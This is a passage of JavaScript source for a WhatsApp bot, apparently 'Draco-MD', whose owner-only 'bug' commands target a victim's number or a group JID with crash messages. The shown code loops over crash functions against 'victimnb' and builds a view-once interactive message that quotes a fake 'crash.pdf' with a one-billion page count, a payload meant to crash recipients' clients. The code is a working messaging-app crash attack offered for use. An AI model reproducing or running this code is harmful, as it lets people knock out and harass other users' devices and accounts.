    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: victimnb, quoted: kuwoted });
await conn.relayMessage(victimnb, etc.message, { participant: { jid: victimnb }, messageId: etc.key.id });
}

for (let j = 0; j < 1; j++) {
await listxeonfck(victimnb, oneclickxeon)
await locationxeony(victimnb, force)
await xeonkillpic(victimnb, oneclickxeon)
await locationxeony(victimnb, force)
await blackening(victimnb, force2)
await locationxeony(victimnb, force)
	}

await conn.sendMessage(from,{text: `*✅ Sᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ Sᴇɴᴛ Bᴜɢꜱ Tᴏ ${victimnb}.*\n\n\n${botwatermark}`})

}catch(e){
console.log(e)
reply(`${e}`)
}
})

cmd({
    pattern: "dgbug",
    desc: "Send bugs to group.",
    category: "bug",
    filename: __filename
},
async(conn, mek, m,{from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
try{

const config = await readEnv();

if(!isOwner) {
	await m.react("❌")
	return reply(`*❗ Tʜɪꜱ Iꜱ Oᴡɴᴇʀ Cᴏᴍᴍᴀɴᴅ. ❗*`)
}
else if(!q) {
	await m.react("❌")
	return reply(`*❗ Gɪᴠᴇ Gʀᴏᴜᴘ Jɪᴅ Tᴏ Sᴇɴᴅ Bᴜɢꜱ.*\n*❗ Exᴀᴍᴘʟᴇ : ${config.PREFIX}dgbug 1234##########@g.us*`)
}

await conn.sendMessage(from,
{ text: `*🔄 Pʟᴇᴀꜱᴇ Wᴀɪᴛ Bᴜɢ Iꜱ Iɴ Pʀᴏᴄᴇꜱꜱ...*`,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 9999999,
isForwarded: false, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": `|| 🐲 Dʀᴀᴄᴏ-Mᴅ Bᴜɢꜱ 🐲 ||`,
"body": ``,
"previewType": "PHOTO",
"thumbnailUrl": `https://i.ibb.co/4pMkfvD/1727092453418.png`,
"thumbnail": ``,
"sourceUrl": ``}}},
{ quoted: mek})

const thumb = `media/pornhub`

const xeonimage = {
    title: "🦄드림 가이 Xeon; ",
    hasMediaAttachment: true,
    imageMessage: thumb.imageMessage
};

const xtext = {
    text: ''
};

conn.relayMessage(q, {
    'viewOnceMessage': {
        'message': {
            'interactiveMessage': {
                'header': xeonimage,
                'body': xtext,
                'nativeFlowMessage': {
                    'buttons': [{
                        'name': "galaxy_message",
                        'buttonParamsJson': JSON.stringify({
                            'header': "🦄드림 가이 Xeon; ",
                            'body': "xxx",
                            'flow_action': "navigate",
                            'flow_action_payload': {
                                'screen': "FORM_SCREEN"
                            },
                            'flow_cta': "xxxxx",
                            'flow_id': "1169834181134583",
                            'flow_message_version': '3',
                            'flow_token': "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
                        })
                    }],
                    'messageParamsJson': ''
                },
                'contextInfo': {
                    'isForwarded': true,
                    'fromMe': false,
                    'participant': "0@s.whatsapp.net",
                    'remoteJid': q,
                    'quotedMessage': {
                        'documentMessage': {
                            'url': "https://mmg.whatsapp.net/v/t62.7119-24/34673265_965442988481988_3759890959900226993_n.enc?ccb=11-4&oh=01_AdRGvYuQlB0sdFSuDAeoDUAmBcPvobRfHaWRukORAicTdw&oe=65E730EB&_nc_sid=5e03e0&mms3=true",
                            'mimetype': "application/pdf",
                            'title': "crash",
                            'pageCount': 0x3b9aca00,
                            'fileName': "crash.pdf",
                            'contactVcard': true
                        }
                    },
                    'forwardedNewsletterMessageInfo': {
                        'newsletterJid': "120363222395675670@newsletter",
                        'serverMessageId': 0x1,
                        'newsletterName': "🦄드림 가이 Xeon"
                    }
                }
            }
        }
    }
}, {});

await conn.sendMessage(from,{text: `*✅ Sᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ Sᴇɴᴛ Bᴜɢꜱ Tᴏ ${q}.*\n\n\n${botwatermark}`})


}catch(e){
console.log(e)
reply(`${e}`)
}
})
